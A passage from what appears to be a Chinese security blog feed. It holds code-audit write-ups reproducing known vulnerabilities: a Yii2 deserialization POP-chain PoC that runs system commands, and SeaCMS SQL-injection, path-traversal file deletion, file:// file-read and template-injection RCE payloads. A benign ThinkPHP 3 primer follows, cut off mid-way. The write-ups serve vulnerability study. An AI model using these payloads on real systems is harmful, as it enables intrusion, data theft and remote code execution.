src="https://gitee.com/lcdm123/image/raw/master/image-20211028114146219.png" alt="image-20211028114146219"></p><p>可以发现<code>clearAll()</code>函数调用了<code>clearKey()</code>，在<code>clearKey()</code>中执行了字符串拼接的操作，所以可以利用这一点来调用<code>__toString()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028114122258.png" alt="image-20211028114122258"></p><p>调用<code>__toString()</code>时控制参数调用<code>render()</code>，然后使用<code>__call()</code>魔术方法完成 POP 链的构造，之后的就可以利用之前的 部分 POP 链了</p><p><code>/vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Deprecated.php</code></p><p><code>/vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Covers.php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028124226068.png" alt="image-20211028124226068"></p><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>\<span class="hljs-title">Deprecated</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $key = [];<br>        <span class="hljs-keyword">private</span> $path;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;path = <span class="hljs-keyword">new</span> Deprecated();<br>            <span class="hljs-keyword">$this</span>-&gt;keys = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;hello&#x27;</span> =&gt; <span class="hljs-string">&#x27;world&#x27;</span><br>            );<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>&#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Deprecated</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> $description;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;description = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> $formatters;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;render&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(), <span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span>()));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028133701106.png" alt="image-20211028133701106"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于反序列化链的挖掘需要先找到入口点比如<code>__destruct()</code> 和 <code>__wakeup()</code>，然后再逐步往后推找到一条完整的链，最终构造一条完整的利用链。看着容易自己找的话还是很有难度的。</p><p>参考文章</p><p><a href="https://so4ms.top/index.php/2021/07/06/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://so4ms.top/index.php/2021/07/06/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://jelly0930.github.io/2021/09/yii2/">https://jelly0930.github.io/2021/09/yii2/</a></p><p><a href="https://v0w.top/2020/09/22/Yii2unserialize/">https://v0w.top/2020/09/22/Yii2unserialize/</a></p><p><a href="https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/">https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;yii2-反序列化漏洞&quot;&gt;&lt;a href=&quot;#yii2-反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;yii2 反序列化漏洞&quot;&gt;&lt;/a&gt;yii2 反序列化漏洞&lt;/h1&gt;&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SeaCMS 代码审计</title>
    <link href="http://example.com/2021/10/27/SeaCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2021/10/27/SeaCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2021-10-27T03:42:38.000Z</published>
    <updated>2021-10-27T03:43:15.671Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SeaCMS-代码审计"><a href="#SeaCMS-代码审计" class="headerlink" title="SeaCMS 代码审计"></a>SeaCMS 代码审计</h1><h2 id="网站环境搭建"><a href="#网站环境搭建" class="headerlink" title="网站环境搭建"></a>网站环境搭建</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211024131021167.png" alt="image-20211024131021167"></p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><h3 id="前端入口-index-php"><a href="#前端入口-index-php" class="headerlink" title="前端入口 index.php"></a>前端入口 <code>index.php</code></h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025231649167.png" alt="image-20211025231649167"></p><blockquote><p>吐槽一下是不是我下载到盗版的源码了怎么改的代码直接注释而不是删除啊</p></blockquote><p>使用 <code>echoIndex()</code> 函数来完成页面打印的操作</p><p>在 <code>include/common.php</code> 中定义了一些初始化操作和安全过滤方法，还包含了一些有安全过滤功能的文件等</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025232148895.png" alt="image-20211025232148895"></p><h3 id="后端入口-admin-index-php"><a href="#后端入口-admin-index-php" class="headerlink" title="后端入口 admin/index.php"></a>后端入口 <code>admin/index.php</code></h3><p>后端入口文件的内容比较少，主要靠包含其他文件实现功能</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025233957441.png" alt="image-20211025233957441"></p><p><code>admin/config.php</code> 中有检测用户是否登录的功能还有一堆其他获取信息的函数</p><p><code>admin/templets</code> 中存储的是后端页面模板</p><blockquote><p>源码就总体简单看了一下，不是特别熟练看了也没有谱，还得多练习</p></blockquote><h2 id="漏洞复现与分析"><a href="#漏洞复现与分析" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h4><p>payload:<code>/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=extractvalue(1,concat_ws(0x7e,user(),database()))</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025000812531.png" alt="image-20211025000812531"></p><p>漏洞产生的点</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026002329021.png" alt="image-20211026002329021"></p><p>这里的 <code>$type</code> 和 <code>$ids</code> 都没有利用单引号包裹</p><p><code>$type</code> 利用之前的 <code>is_numeric()</code> 函数检测了类型，所以不能使用字符串</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026112501752.png" alt="image-20211026112501752"></p><p>搜先是执行到一个 <code>if</code> 语句判断 <code>$page</code> 是否大于2,如果大于二就跳过执行后面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026113502092.png" alt="image-20211026113502092"></p><p>我们需要执行到 <code>ReadData()</code> 函数，在该函数中需要 <code>$id &gt; 0</code> 才可以执行到 <code>ReadrList()</code> 函数中，并且 <code>$x</code> 为 <code>implode(&#39;,&#39; , $rlist)</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026113912958.png" alt="image-20211026113912958"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026113613051.png" alt="image-20211026113613051"></p><p>满足上面的条件后就可以使用 <code>Readrlist()</code> 函数，这里的 <code>$ids</code> 就是 <code>$x</code> 的值，所以我们可以控制 <code>$rlist</code> 的值来实现控制 <code>$ids</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026114030690.png" alt="image-20211026114030690"></p><p>总结一下要执行到漏洞语句这里需要的条件</p><ol><li><code>$page &gt; 2</code></li><li><code>$id &gt; 0</code> 也就是 <code>$gid</code></li><li><code>$rlist</code> 为数组</li></ol><p>构造的语句的时候还需要注意绕过过滤，一下是过滤文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026121200334.png" alt="image-20211026121200334"></p><p>绕过里面包含了一些常见的 XSS SQL 等</p><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>发现一个类似于目录遍历的点，但是直接利用不行，所以查看一下源码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026132733737.png" alt="image-20211026132733737"></p><p>源码很容易绕过，保证0到11的字母是 <code>../templets/</code> 即可</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026133031797.png" alt="image-20211026133031797"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026133128656.png" alt="image-20211026133128656"></p><p>可以执行任意文件删除了</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>在<code>admin/templets/admin_collect_ruleadd2.htm</code>中有文件读取的操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026140130062.png" alt="image-20211026140130062"></p><p>读取的目标是 <code>$siteurl</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026140829070.png" alt="image-20211026140829070"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026140852762.png" alt="image-20211026140852762"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin/admin_collect_news.php</span> HTTP/1.1<br><span class="hljs-attribute">Host</span>: 192.168.148.172<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<br><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span>: http://192.168.148.172/admin/<br><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<br><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span>: PHPSESSID=fm1vheb6hm439qqhktpbpecro3<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span>: 72<br><br>action=addrule&amp;step=2&amp;itemname=1&amp;siteurl=file://C:/test/1.txt&amp;showcode=1<br></code></pre></td></tr></table></figure><p>GET POST 都可以</p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">// payload1</span><br>http:<span class="hljs-comment">//ip/search.php</span><br>POST: searchtype=<span class="hljs-number">5</span>&amp;order=&#125;&#123;end <span class="hljs-keyword">if</span>&#125; &#123;<span class="hljs-keyword">if</span>:<span class="hljs-number">1</span>)phpinfo();<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>&#125;&#123;end <span class="hljs-keyword">if</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026231934858.png" alt="image-20211026231934858"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">// payload2<br><br>POST:<br>searchtype=5&amp;order=&#125;&#123;end if&#125;&#123;if:1)$<span class="hljs-emphasis">_POST[<span class="hljs-string">func</span>](<span class="hljs-link">$_POST[cmd]</span>);if(1&#125;&#123;end if&#125;&amp;func=system&amp;cmd=whoami</span><br><span class="hljs-emphasis">searchtype=5&amp;order=&#125;&#123;end if&#125;&#123;if:1)$_</span>POST[<span class="hljs-string">func</span>](<span class="hljs-link">$_POST[cmd]</span>);//&#125;&#123;end if&#125;&amp;func=system&amp;cmd=whoami<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026232316527.png" alt="image-20211026232316527"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026232338978.png"></p><p>直接跟着 payload 走一遍</p><p>POST 传入数据后，<code>$searchtype</code> 需要为 5 才能进入这个选择，后面的 <code>$order</code> 会被替换进 <code>$content</code> 中加入后续的执行</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027002348054.png" alt="image-20211027002348054"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027004534871.png" alt="image-20211027004534871"></p><p>这样就可以执行命令了，payload 就是依靠闭合语句实现命令的执行</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027005417801.png" alt="image-20211027005417801"></p><p>主要还是对参数的过滤不到位</p><p>payload 的构造 <code>$order=&#125;&#123;end if&#125; &#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;</code></p><p>首先第一个<code>&#125;</code>是为了闭合之前的，然后使用 <code>&#123;if: </code> 这样才能进入 <code>@eval()</code> 这个函数执行，使用 <code>&#123;end if&#125;</code> 就是执行 <code>if</code> 选择使他能够执行到后面的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027010247159.png" alt="image-20211027010247159"></p><p>这个漏洞感觉要直接挖出来还是比较难的，但是原理感觉不是特别难，就是字符串拼接导致命令执行了，希望有一天我也可以挖到 RCE 啊！！！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于代码审计还是需要结合功能点和代码一起审计，这样才效率才会比较，然后再结合所有代码看一遍，这样才能实现漏洞的深度挖掘。</p><p>参考文章</p><p><a href="https://nikoeurus.github.io/2019/04/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-seacms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%886.45%E5%90%8E%E7%BB%AD%E7%89%88%E6%9C%AC%EF%BC%89/#seacms-6-61">https://nikoeurus.github.io/2019/04/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-seacms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%886.45%E5%90%8E%E7%BB%AD%E7%89%88%E6%9C%AC%EF%BC%89/#seacms-6-61</a></p><p><a href="https://jelly0930.github.io/2021/09/seacms/">https://jelly0930.github.io/2021/09/seacms/</a></p><p><a href="https://www.cnblogs.com/ffx1/p/12653597.html">https://www.cnblogs.com/ffx1/p/12653597.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SeaCMS-代码审计&quot;&gt;&lt;a href=&quot;#SeaCMS-代码审计&quot; class=&quot;headerlink&quot; title=&quot;SeaCMS 代码审计&quot;&gt;&lt;/a&gt;SeaCMS 代码审计&lt;/h1&gt;&lt;h2 id=&quot;网站环境搭建&quot;&gt;&lt;a href=&quot;#网站环境搭建&quot; cla</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>TP3代码审计</title>
    <link href="http://example.com/2021/10/23/TP3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2021/10/23/TP3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2021-10-23T03:28:19.000Z</published>
    <updated>2021-10-23T03:29:35.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP-3"><a href="#ThinkPHP-3" class="headerlink" title="ThinkPHP 3"></a>ThinkPHP 3</h1><h2 id="框架学习"><a href="#框架学习" class="headerlink" title="框架学习"></a>框架学习</h2><blockquote><p>ThinkPHP 3.2.3</p></blockquote><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">www</span>  <span class="hljs-selector-tag">WEB</span>部署目录（或者子目录）<br>├─<span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span>       入口文件<br>├─<span class="hljs-selector-tag">README</span><span class="hljs-selector-class">.md</span>       <span class="hljs-selector-tag">README</span>文件<br>├─<span class="hljs-selector-tag">Application</span>     应用目录<br>├─<span class="hljs-selector-tag">Public</span>          资源文件目录<br>└─<span class="hljs-selector-tag">ThinkPHP</span>        框架目录<br></code></pre></td></tr></table></figure><p>框架目录ThinkPHP的结构</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">├─ThinkPHP 框架系统目录（可以部署在非web目录下面）<br>│  ├─Common       核心公共函数目录<br>│  ├─Conf         核心配置目录 <br>│  ├─Lang         核心语言包目录<br>│  ├─Library      框架类库目录<br>│  │  ├─Think     核心Think类库包目录<br>│  │  ├─Behavior  行为类库目录<br>│  │  ├─Org       Org类库包目录<br>│  │  ├─Vendor    第三方类库目录<br>│  │  ├─<span class="hljs-operator"> ...      </span>更多类库目录<br>│  ├─Mode         框架应用模式目录<br>│  ├─Tpl          系统模板目录<br>│  ├─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LICENSE</span>.</span></span>txt  框架授权协议文件<br>│  ├─logo.png     框架LOGO文件<br>│  ├─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">README</span>.</span></span>txt   框架README文件<br>│  └─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ThinkPHP</span>.</span></span>php 框架入口文件<br></code></pre></td></tr></table></figure><p>下面是官方建议</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210925220346848.png" alt="image-20210925220346848"></p><p>试了一下如果默认这么放的话，可以读取到其他文件中的内容，比如日志</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210925220511043.png" alt="image-20210925220511043"></p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>ThinkPHP 的默认配置文件定义格式均采用返回 PHP 数组的格式</p><p>配置的加载顺序是：<strong>惯例配置-&gt;应用配置-&gt;模式配置-&gt;调试配置-&gt;状态配置-&gt;模块配置-&gt;扩展配置-&gt;动态配置</strong></p><p><strong>配置的读取</strong></p><p>C（config）方法，读取已有的配置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">C(<span class="hljs-string">&#x27;URL_MODEL&#x27;</span>); <span class="hljs-regexp">//</span> 读取URL模式配置参数，如果未配置则会返回 NULL<br>参数名称不能含有 . 和特殊字符<br><br>C(<span class="hljs-string">&#x27;my_config&#x27;</span>,null,<span class="hljs-string">&#x27;default_config&#x27;</span>); <span class="hljs-regexp">//</span> 如果my_config尚未设置的话，则返回default_config字符串<br><br>C(<span class="hljs-string">&#x27;USER_CONFIG.USER_TYPE&#x27;</span>); <span class="hljs-regexp">//</span>读取二维配置，获取用户配置中的用户类型设置<br><br>动态配置<br>C(<span class="hljs-string">&#x27;DATA_CACHE_TIME&#x27;</span>,<span class="hljs-number">60</span>); <span class="hljs-regexp">//</span> 动态改变缓存有效期<br>动态配置赋值仅对当前请求有效，不会对以后的请求造成影响。<br><br>二维配置<br><span class="hljs-regexp">//</span> 获取已经设置的参数值<br>C(<span class="hljs-string">&#x27;USER_CONFIG.USER_TYPE&#x27;</span>);<br><span class="hljs-regexp">//</span> 设置新的值<br>C(<span class="hljs-string">&#x27;USER_CONFIG.USER_TYPE&#x27;</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><strong>架构</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926135357258.png" alt="image-20210926135357258"></p><blockquote><p>ThinkPHP 框架的 URL 是区分大小写的</p><p><code>&#39;URL_CASE_INSENSITIVE&#39; =&gt; true</code> 设置为 True 表示不区分大小写</p></blockquote><p>D 方法，实例化对象</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">D</span><span class="hljs-params">(<span class="hljs-string">&#x27;User&#x27;</span>)</span></span>  <span class="hljs-comment">// 实例化 UserModel</span><br><span class="hljs-function"><span class="hljs-title">D</span><span class="hljs-params">(<span class="hljs-string">&#x27;User&#x27;</span>,<span class="hljs-string">&#x27;Logic&#x27;</span>)</span></span> <span class="hljs-comment">// 实例化 UserLogic</span><br><span class="hljs-function"><span class="hljs-title">D</span><span class="hljs-params">(<span class="hljs-string">&#x27;User&#x27;</span>,<span class="hljs-string">&#x27;Service&#x27;</span>)</span></span> <span class="hljs-comment">// 实例化 UserService</span><br></code></pre></td></tr></table></figure><p><strong>控制器</strong></p><p>I 方法是 ThinkPHP 中获取系统输入变量的，可以用于任何地方</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">I(<span class="hljs-string">&#x27;变量类型.变量名/修饰符&#x27;</span>,[<span class="hljs-string">&#x27;默认值&#x27;</span>],[<span class="hljs-string">&#x27;过滤方法或正则&#x27;</span>],[<span class="hljs-string">&#x27;额外数据源&#x27;</span>])<br>I(<span class="hljs-string">&#x27;get.id&#x27;</span>); <span class="hljs-regexp">//</span> 等价于 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]<br>I(<span class="hljs-string">&#x27;get.id&#x27;</span>,<span class="hljs-number">0</span>); <span class="hljs-regexp">//</span> 如果不存在 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] 就返回 <span class="hljs-number">0</span><br>I(<span class="hljs-string">&#x27;get.name&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;htmlspecialchars&#x27;</span>); <span class="hljs-regexp">//</span> 使用 htmlspecialchars 过滤，如果没有就返回空<br></code></pre></td></tr></table></figure><p><strong>模型</strong></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gams">模型实例化<br><span class="hljs-number">1.</span> <span class="hljs-symbol">$</span>user = new \Home\<span class="hljs-keyword">Model</span>\UserModel();<br><span class="hljs-number">2.</span> <span class="hljs-symbol">$</span>user = D(<span class="hljs-string">&#x27;User&#x27;</span>);<br>如果只对数据表进行基本的 CURD 操作，使用 M 方法的可能性会更高一点<br>   <span class="hljs-symbol">$</span>User = M(<span class="hljs-string">&#x27;User&#x27;</span>); <span class="hljs-comment">// $User = new \Think\Model(&#x27;User&#x27;)</span><br>   <span class="hljs-symbol">$</span>User-&gt;select()<br><span class="hljs-number">3.</span> 实例化空模型<br><span class="hljs-symbol">$</span><span class="hljs-keyword">Model</span> = new  <span class="hljs-keyword">Model</span>();<br><span class="hljs-symbol">$</span><span class="hljs-keyword">Model</span> = M(); <span class="hljs-comment">// 与上面等价</span><br><span class="hljs-symbol">$</span><span class="hljs-keyword">Model</span>-&gt;query(<span class="hljs-string">&#x27;SELECT * FROM think_user WHERE status = 1&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>数据库操作</strong></p><blockquote><p>ThinkPHP 3 模型基础类 Model 类提供了很多操作数据库的方法</p></blockquote><p><code>where()</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">where</span> 方法的参数支持的字符串和数组，主要用于获取 <span class="hljs-keyword">SQL</span> 语句的 <span class="hljs-keyword">where</span> 部分<br></code></pre></td></tr></table></figure><p><code>select()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">获取数据表中的多行记录<br></code></pre></td></tr></table></figure><p><code>find()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 